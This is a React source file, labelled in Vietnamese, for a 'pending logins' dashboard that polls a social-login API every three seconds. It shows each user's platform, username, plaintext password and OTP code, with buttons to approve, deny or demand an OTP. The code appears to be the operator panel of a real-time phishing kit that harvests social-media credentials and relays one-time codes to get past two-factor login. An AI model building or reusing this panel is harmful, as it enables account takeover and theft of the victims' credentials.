import React, { useEffect, useMemo, useRef, useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { useToast } from '@/components/ui/use-toast';

export default function PendingLoginsPage() {
  const [rows, setRows] = useState([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [adminKey, setAdminKey] = useState(() => localStorage.getItem('ADMIN_KEY') || '');
  const [poll, setPoll] = useState(true);
  const { toast } = useToast?.() || { toast: () => {} };
  const timerRef = useRef(null);

  useEffect(() => {
    localStorage.setItem('ADMIN_KEY', adminKey || '');
  }, [adminKey]);

  const headers = useMemo(() => {
    const h = { 'content-type': 'application/json' };
    if (adminKey) h['x-admin-key'] = adminKey;
    return h;
  }, [adminKey]);

  async function load() {
    setLoading(true); setError('');
    try {
  const res = await fetch('/api/social-login/pending?status=pending', { credentials: 'include' });
      const json = await res.json();
      if (!res.ok || !json?.success) throw new Error(json?.message || `HTTP ${res.status}`);
      setRows(json.data || []);
    } catch (e) {
      setError(String(e?.message || e));
    } finally {
      setLoading(false);
    }
  }

  useEffect(() => {
    load();
  }, []);

  useEffect(() => {
    if (!poll) return;
    timerRef.current && clearInterval(timerRef.current);
    timerRef.current = setInterval(() => { load(); }, 3000);
    return () => { timerRef.current && clearInterval(timerRef.current); };
  }, [poll]);

  async function act(endpoint, id) {
    try {
  const res = await fetch(`/api/social-login/${endpoint}`, {
        method: 'POST',
        headers,
        credentials: 'include',
        body: JSON.stringify({ id })
      });
      const json = await res.json();
      if (!res.ok || !json?.success) {
        const msg = json?.message || `HTTP ${res.status}`;
        if (res.status === 401) {
          setError('Unauthorized: Hãy nhập ADMIN_KEY nếu server yêu cầu.');
        } else {
          setError(msg);
        }
        return;
      }
      toast({ title: 'Thành công', description: `${endpoint} -> ${id}` });
      load();
    } catch (e) {
      setError(String(e?.message || e));
    }
  }

  return (
    <div className="p-4">
      <Card className="cyber-card-bg">
        <CardHeader>
          <CardTitle className="text-white">Đăng nhập đang chờ phê duyệt</CardTitle>
          <CardDescription className="text-gray-400">Xem và xử lý yêu cầu đăng nhập của web user.</CardDescription>
        </CardHeader>
        <CardContent>
          <div className="flex flex-wrap items-end gap-3 mb-4">
            <div>
              <div className="text-xs mb-1 text-gray-400">ADMIN_KEY (tùy chọn)</div>
              <Input value={adminKey} onChange={(e)=>setAdminKey(e.target.value)} placeholder="Nhập ADMIN_KEY nếu server yêu cầu" className="bg-slate-800/50 border-slate-700 text-white" />
            </div>
            <Button variant="outline" onClick={load} disabled={loading}>Tải lại</Button>
            <Button variant={poll ? 'secondary' : 'default'} onClick={()=>setPoll(!poll)}>{poll ? 'Tắt tự động tải' : 'Bật tự động tải'}</Button>
          </div>
          {error && <div className="text-red-400 text-sm mb-2">{error}</div>}
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="text-gray-400">
                  <th className="text-left p-2">Thời gian</th>
                  <th className="text-left p-2">Nền tảng</th>
                  <th className="text-left p-2">Tài khoản</th>
                  <th className="text-left p-2">Ghi chú</th>
                  <th className="text-left p-2">Trạng thái</th>
                  <th className="text-right p-2">Hành động</th>
                </tr>
              </thead>
              <tbody>
                {rows.map(r => (
                  <tr key={r.id} className="border-t border-slate-800 text-white">
                    <td className="p-2 whitespace-nowrap">{new Date(r.createdAt || Date.now()).toLocaleString('vi-VN')}</td>
                    <td className="p-2 whitespace-nowrap">{r.platform}</td>
                    <td className="p-2">
                      <div className="font-medium break-all">{r.username}</div>
                      <div className="text-xs text-gray-400 break-all">{r.password ? `PW: ${r.password}` : ''}{r.otp ? ` • OTP: ${r.otp}` : ''}</div>
                    </td>
                    <td className="p-2 text-xs text-gray-300 break-all">{r.note || ''}</td>
                    <td className="p-2">{r.status}</td>
                    <td className="p-2 text-right">
                      <div className="flex gap-2 justify-end">
                        <Button size="sm" onClick={()=>act('approve', r.id)}>Phê duyệt</Button>
                        <Button size="sm" variant="secondary" onClick={()=>act('require-otp', r.id)}>Yêu cầu OTP</Button>
                        <Button size="sm" variant="destructive" onClick={()=>act('deny', r.id)}>Từ chối</Button>
                      </div>
                    </td>
                  </tr>
                ))}
                {rows.length === 0 && (
                  <tr>
                    <td className="p-3 text-gray-400" colSpan={6}>Không có yêu cầu đang chờ.</td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
